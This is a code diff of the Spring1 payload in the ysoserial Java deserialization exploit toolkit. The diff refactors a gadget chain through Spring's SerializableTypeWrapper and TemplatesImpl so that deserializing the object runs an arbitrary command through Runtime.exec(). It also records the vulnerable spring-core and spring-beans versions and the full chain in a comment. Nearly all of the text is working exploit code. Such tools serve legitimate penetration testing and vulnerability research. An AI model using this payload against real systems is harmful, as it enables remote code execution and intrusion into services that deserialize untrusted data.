@@ -5,23 +5,20 @@ import static java.lang.Class.forName;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Type;
-import java.util.Arrays;
-import java.util.List;
 
 import javax.xml.transform.Templates;
 
 import org.springframework.beans.factory.ObjectFactory;
 
-import ysoserial.payloads.util.ClassFiles;
+import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 
 /*
-	Gadget chains:
+	Gadget chain:
 	
 		ObjectInputStream.readObject()
 			SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
@@ -43,28 +40,18 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 									TemplatesImpl.newTransformer()
 										TemplatesImpl.getTransletInstance()
 											TemplatesImpl.defineTransletClasses()
-												TemplatesImpl.TransletClassLoader.defineClass()			
-			Gadgets.TransletPayload.readObject()
-				Runtime.exec()
-	
-	Requires:
-		spring-framework-core
+												TemplatesImpl.TransletClassLoader.defineClass()
+													Pwner*(Javassist-generated).<static init>
+														Runtime.exec()
+
  */
 
 @SuppressWarnings({"restriction", "rawtypes"})
-public class Spring1 extends PayloadRunner implements ObjectPayload<List<Object>> {
+@Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
+public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 	
-	public List<Object> getObject(final String command) throws Exception {
-		final TemplatesImpl templates = new TemplatesImpl();
-		
-		// inject class bytes into instance
-		Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
-			ClassFiles.classAsBytes(Gadgets.TransletPayload.class), 
-			ClassFiles.classAsBytes(Gadgets.Foo.class)});
-		
-		// required to make TemplatesImpl happy
-		Reflections.setFieldValue(templates, "_name", "Pwnr"); 			
-		Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+	public Object getObject(final String command) throws Exception {
+		final TemplatesImpl templates = Gadgets.createTemplatesImpl(command);
 		
 		final ObjectFactory objectFactoryProxy = 
 				Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
@@ -78,14 +65,13 @@ public class Spring1 extends PayloadRunner implements ObjectPayload<List<Object>
 				forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
 		
 		final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
-		final Object mitp = mitpCtor.newInstance(typeProviderProxy, Templates.class.getMethod("newTransformer", new Class[] {}), 0);
+		final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
+		Reflections.setFieldValue(mitp, "methodName", "newTransformer");
 
-		Reflections.setFieldValue(templates, "_auxClasses", null); // required to make TemplatesImpl serialization happy
-		
-		return Arrays.asList(mitp, new Gadgets.TransletPayload().withCommand(command));
+		return mitp;
 	}
-	
-	public static void main(final String[] args) {
+
+	public static void main(final String[] args) throws Exception {
 		PayloadRunner.run(Spring1.class, args);
 	}
 
